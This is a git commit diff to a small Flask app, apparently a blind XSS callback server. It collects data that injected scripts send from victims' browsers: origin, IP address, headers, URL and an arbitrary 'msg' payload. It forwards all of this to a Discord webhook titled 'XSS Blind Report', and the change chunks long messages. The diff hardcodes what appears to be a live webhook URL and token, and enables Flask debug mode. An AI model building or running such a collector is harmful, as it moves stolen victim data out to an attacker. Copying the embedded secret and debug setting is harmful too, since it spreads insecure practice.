3ae8567a9434d2b564af5ddb4c0cf19ab8dcc80f
hamed <59232795+hamed-frz@users.noreply.github.com>
2023-05-28 04:41:28 -0300

    Update app.py
    change bxx app for send larg message to discord

--- python/bxx/app.py
+++ python/bxx/app.py
@@ -2,6 +2,7 @@ from flask import Flask, request
 import requests
 import flask
 import urllib
+import time
 app = Flask(__name__)
 
 
@@ -11,25 +12,32 @@ def send_request():
     http_method = request.method
     http_url = request.url
     http_headers = request.headers
-    http_data = str(request.data)
-    req_msg_param_value = 'null' if request.form.get('msg') == None else {urllib.parse.unquote_plus(str(request.form.get('msg')))}
+    http_data = urllib.parse.unquote_plus(str(request.get_data()))
+
+    req_msg_param_value = 'null' if request.form.get('msg') == None else str(request.form.get('msg'))
     origin_of_req = 'null' if request.environ.get('HTTP_ORIGIN', 'default value') == None else str(request.environ.get('HTTP_ORIGIN', 'default value'))
     # Send HTTP parts to Discord webhook
-    webhook_url = "__BXX_DISCORD__"
+    webhook_url = "https://discord.com/api/webhooks/1104721845904756838/J-jpt0W_i4vTFxdyWLMd4aYA9XcSnwGKpxTR_6W-lRECWOpthfTxqhUF8VLJ19_nsm3z"
     webhook_data = {}
 
     message_embeds = [{ "description":f"Request send from:\n Origin: {origin_of_req}\n\n \
                               Sender ip address:\n{request.headers.getlist('X-Forwarded-For')[0]}\n\n \
-                              Message:\n{req_msg_param_value}\n\n \
                               -------------------------------------------------------------------------\n\
-                             ```Method: {http_method} \nURL: {http_url} \n\nHeaders:\n{http_headers}\nData:\n{http_data}```", \
+                             ```Method: {http_method} \nURL: {http_url} \n\nHeaders:\n{http_headers}\n\n```", \
                              "title":"XSS Blind Report", \
                              }]
     webhook_data["embeds"] = message_embeds
-
     requests.post(webhook_url, json = webhook_data)
-
-    # Set Access-Control-Allow-Origin header to allow all origins
+    i = 0
+    split_size=1500
+    for i in range(0,len(req_msg_param_value)//split_size):
+        webhook_data = {}
+        message_embeds = [{"description":"msg{}:\n {}".format(i+1,req_msg_param_value[i*split_size:(i+1)*split_size])\
+        }]
+        webhook_data["embeds"] = message_embeds
+        requests.post(webhook_url, json = webhook_data)
+        # Set Access-Control-Allow-Origin header to allow all origins
+        time.sleep(0.2)
     response_headers = {
         'Access-Control-Allow-Origin': '*'
     }
@@ -39,4 +47,4 @@ def send_request():
     return resp
 
 if __name__ == '__main__':
-    app.run()
+    app.run(debug=True)
